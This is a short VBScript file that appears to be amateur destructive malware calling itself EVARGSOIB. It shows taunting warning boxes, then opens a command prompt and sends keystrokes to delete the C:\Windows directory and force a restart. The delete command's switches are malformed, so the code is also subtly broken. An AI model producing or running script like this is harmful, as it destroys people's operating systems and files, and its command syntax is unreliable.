MsgBox "You'd execute app called EVARGSOIB, made by AlexVirusCiberneticos, it can harm your pc and make it unsuable!",0+48,"EVARGSOIB"
MsgBox "This the last warning, I give you a chance of restarting your PC, before I destroy your system.",0+48,"EVARGSOIB"
MsgBox "So, today I'll being destroying your computer!",0+16,"EVARGSOIB"
MsgBox "Wanna get some files deleted?",4+16,"EVARGSOIB"
Msgbox "I'll restart your pc."
Dim obj
Set obj = Wscript.CreateObject("Wscript.Shell")
Return = obj.run ("cmd.exe",2,false)
Wscript.sleep 300
obj.SendKeys "del C:\Windows f/ q/ s"
obj.SendKeys "{ENTER}"
obj.SendKeys "shutdown -r -t 2"
obj.SendKeys "{ENTER}"
obj.SendKeys "{END}"
